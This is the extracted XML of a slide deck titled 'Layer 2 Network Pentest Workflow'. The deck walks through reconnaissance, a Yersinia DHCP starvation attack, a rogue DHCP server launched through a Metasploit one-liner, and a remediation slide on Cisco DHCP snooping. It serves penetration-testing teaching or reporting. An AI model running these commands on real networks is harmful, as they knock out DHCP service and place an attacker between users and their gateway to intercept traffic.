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Libre Baskerville" panose="02000000000000000000" pitchFamily="2" charset="0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86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Layer 2 Network Pentest Workflow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850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1: Reconnaissance &amp; Information Gathering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196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 is to identify the network environment and detect the presence of defensive protocols (like STP or CDP).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37742"/>
            <a:ext cx="4196358" cy="3043237"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4808"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FBFAFF"/>
          </a:solidFill>
          <a:ln w="30480">
            <a:solidFill>
              <a:srgbClr val="E7E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837742"/>
            <a:ext cx="121920" cy="3043237"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 27907"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E7E0FF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095036"/>
            <a:ext cx="3246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Check Interface Status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2524" y="4704517"/>
            <a:ext cx="3590330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8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1131213" y="4704517"/>
            <a:ext cx="3612952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9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1358027" y="4874538"/>
            <a:ext cx="31593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 link show eth0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837742"/>
            <a:ext cx="4196358" cy="3043237"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4808"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FBFAFF"/>
          </a:solidFill>
          <a:ln w="30480">
            <a:solidFill>
              <a:srgbClr val="E7E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6482" y="3837742"/>
            <a:ext cx="121920" cy="3043237"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 27907"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E7E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65696" y="4095036"/>
            <a:ext cx="33560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Identify Local Network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565696" y="4704517"/>
            <a:ext cx="3590330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554385" y="4704517"/>
            <a:ext cx="3612952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5781199" y="4874538"/>
            <a:ext cx="31593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 show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837742"/>
            <a:ext cx="4196358" cy="3043237"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4808"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FBFAFF"/>
          </a:solidFill>
          <a:ln w="30480">
            <a:solidFill>
              <a:srgbClr val="E7E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9653" y="3837742"/>
            <a:ext cx="121920" cy="3043237"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 27907"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="E7E0FF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="18" name="Text 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9988868" y="409503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Listen for CDP/LLDP Packets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88868" y="493978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Yersinia in interactive mode and check the CDP tab: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988868" y="5920740"/>
            <a:ext cx="3590330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21" name="Shape 19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9977557" y="5920740"/>
            <a:ext cx="3612952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4371" y="6090761"/>
            <a:ext cx="31593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yersinia -I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283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2: Vulnerability Assessment (Scanning)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8607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if the DHCP server is "starvable" and identify the switch's behavior.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8670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878860" y="39095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3944898"/>
            <a:ext cx="3441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Check for DHCP Server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530906" y="4554379"/>
            <a:ext cx="6819305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9" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1519595" y="4554379"/>
            <a:ext cx="6841927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10" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1746409" y="4724400"/>
            <a:ext cx="63882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nmap --script broadcast-dhcp-discover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7109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878860" y="57534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1530906" y="5788819"/>
            <a:ext cx="44648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Sniff Traffic for DORA Process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530906" y="6398300"/>
            <a:ext cx="6819305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15" name="Shape 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1519595" y="6398300"/>
            <a:ext cx="6841927" cy="702945"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 4840"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEEDF2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="16" name="Text 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1746409" y="6568321"/>
            <a:ext cx="63882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tcpdump -i eth0 port 67 or port 68 -vv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7952"/>
            <a:ext cx="78226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3: Exploitation (The Attack)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15202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the attack to prove the vulnerability. In your case, this is the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="14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DHCP Starvation</a:t>
            </a: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3178" y="2039660"/>
            <a:ext cx="6561296" cy="5431988"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 501"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="AFCBF8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Text 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="844629" y="2184797"/>
            <a:ext cx="43016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Launch Starvation Attack (CLI Mode)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4629" y="2613422"/>
            <a:ext cx="619839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command sends a flood of DISCOVER packets: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4629" y="3037880"/>
            <a:ext cx="6198394" cy="533400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5103"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="A2BEEB"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="835581" y="3037880"/>
            <a:ext cx="6216491" cy="533400"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 5103"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="A2BEEB"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1017032" y="3173968"/>
            <a:ext cx="585358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A2B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yersinia dhcp -attack 1 -i eth0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4157" y="2184797"/>
            <a:ext cx="332160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Launch via Interactive Mode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4157" y="2631519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157" y="2917031"/>
            <a:ext cx="6300073" cy="228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44157" y="3053477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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="14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yersinia -I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44157" y="3595926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157" y="3863340"/>
            <a:ext cx="6300073" cy="228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4157" y="4017883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Press </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="14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544157" y="4560332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157" y="4809649"/>
            <a:ext cx="6300073" cy="228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44157" y="4982289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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="14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DHCP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544157" y="5524738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157" y="5755958"/>
            <a:ext cx="6300073" cy="228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4157" y="5946696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Press </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="14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44157" y="6489144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157" y="6702266"/>
            <a:ext cx="6300073" cy="228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44157" y="6911102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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="14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16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4: Post-Exploitation (Lateral Movement)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7932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the legitimate server is starved, you can perform a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Rogue DHCP Server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attack to become the gateway.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160282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4511993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443770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Rogue DHCP Server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Example using Metasploit auxiliary module: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5742146"/>
            <a:ext cx="7556421" cy="1065848"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3192"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEEDF2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Shape 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="782479" y="5742146"/>
            <a:ext cx="7579043" cy="1065848"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 3192"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEEDF2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1009293" y="5912168"/>
            <a:ext cx="71254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msfconsole -q -x "use auxiliary/server/dhcp; set DNSSERVER 8.8.8.8; set SRVHOST &lt;YOUR_IP&gt;; run"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6488"/>
            <a:ext cx="9994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5: Reporting &amp; Remediation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88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the most important part for your document. You must provide the "fix."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6948"/>
            <a:ext cx="6407944" cy="3596164"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 94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237428"/>
            <a:ext cx="6346984" cy="68044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1051084" y="4144685"/>
            <a:ext cx="4579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Remediation Recommendation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63510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DHCP Snooping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the switch.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06948"/>
            <a:ext cx="6408063" cy="3596164"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 94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3237428"/>
            <a:ext cx="6347103" cy="68044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7685842" y="4144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Cisco Command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85842" y="4754166"/>
            <a:ext cx="5893475" cy="1791652"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1899"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEED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674531" y="4754166"/>
            <a:ext cx="5916097" cy="1791652"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 1899"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EEEDF2"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7901345" y="4924187"/>
            <a:ext cx="54624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Switch(config)# ip dhcp snooping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Switch(config)# ip dhcp snooping vlan 1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Switch(config-if)# ip dhcp snooping trust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Only on the port connected to the REAL server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Custom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Consolas</vt:lpstr>
      <vt:lpstr>Libre Baskerville Light</vt:lpstr>
      <vt:lpstr>Libre Baskerville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2026-03-11T10:31:45Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-03-11T10:32:41Z</dcterms:modified>
</cp:coreProperties>
</file>